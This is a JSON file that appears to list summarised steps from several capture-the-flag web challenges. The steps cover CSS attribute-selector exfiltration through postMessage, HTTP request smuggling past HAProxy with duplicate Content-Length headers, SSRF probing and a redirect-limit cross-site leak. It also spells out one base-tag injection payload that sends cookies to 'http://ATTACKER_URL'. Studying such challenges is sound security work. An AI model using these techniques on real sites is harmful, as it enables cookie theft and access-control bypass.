{
    "Website Interface and Navigation": [
        "Observed the HTML interface for writing and saving notes.",
        "Checked if the 'enableapi' query parameter was set to 'true'.",
        "Checked if the 'recv' query parameter was a subdomain of 'jsapi.tech'.",
        "Checked if the window was framed or opened by another window.",
        "Verified the GitHub pages site at 'asdf.jsapi.tech' can be served.",
        "Understood the condition for adding DOMPurify-sanitized HTML into the child iframe.",
        "Noted that the postMessage should start with 'NOTE_APP_SET_REQUEST' to trigger the addition.",
        "Noted that adding something before the '<link>' tag fixes the behavior.",
        "Discovered that CSS attribute selectors can be used for exfiltration.",
        "Confirmed that the URL specified in the 'background' property is fetched conditionally.",
        "Noted that each character of the flag has a background URL corresponding to it.",
        "Loaded the challenge page as an 'iframe' in the exploit page.",
        "Waited for the API to be loaded on the challenge page.",
        "Sent a 'postMessage' linking the generated CSS to the target page.",
        "Redeployed the exploit GitHub page.",
        "Recognized that the '/flag' endpoint is case sensitive.",
        "Requested the '/FLAG' endpoint."
    ],
    "HTTP Request Manipulation": [
        "Executed a POST request.",
        "Included an overflowing 'Content-Length' header.",
        "Included a second 'Content-Length' header with a value of 26.",
        "Placed a second dummy 'GET / HTTP/1.1' request.",
        "The second request was treated as a separate request by HAProxy.",
        "Modified the requests after reaching the backend server.",
        "Set 'GET /flag HTTP/1.1' as the second request.",
        "Received a response for the second consequent request.",
        "The response corresponded to '/flag' instead of '/'."
    ],
    "Exploiting URL and Base Tag": [
        "Visit the target website.",
        "Manipulate the '<base>' tag in the target website to change the base URL to the control of the attacker.",
        "Create a crafted attack URL with '?src=/img/saturn.jpg'><base href=\"http://ATTACKER_URL\">'.",
        "Trigger the browser to fetch the attacker-controlled site's root path, '/' with the cookie value appended."
    ],
    "File Upload and SSRF Analysis": [
        "Verify that the identified web application allows file uploads and conversions.",
        "Evaluate the web application's functionality to identify potential SSRF or file inclusion vectors.",
        "Submit the file upload request and monitor for any callbacks from the server."
    ],
    "Challenge Investigation and Exploitation": [
        "Analyzed the challenge website where notes could be created and searched.",
        "Investigated the search function.",
        "Observed the usage of 302 server-side redirect to '/view' for a matching note.",
        "Researched the Fetch API's limit of 20 redirects causing a network error.",
        "Redirected the attacker server to the target URL after 19 redirects.",
        "Redirected the PHP script to the target URL after 19 redirects.",
        "Observed reflection of the input into an XSL document.",
        "Tested rendering in the browser."
    ],
    "API Interaction and Requests": [
        "Understand purchasing requests and conditions.",
        "Send purchase requests to the API.",
        "Send POST request to '/api/tet/list' endpoint.",
        "Send POST request to '/api/tet/years' endpoint."
    ],
    "General Web Application Actions": [
        "Navigate to the root directory.",
        "Visited the provided webpage",
        "Sent a request to the API endpoint",
        "Recognize that access is prevented unless not going through the proxy.",
        "Recognize that STTF is a Chromium feature."
    ]
}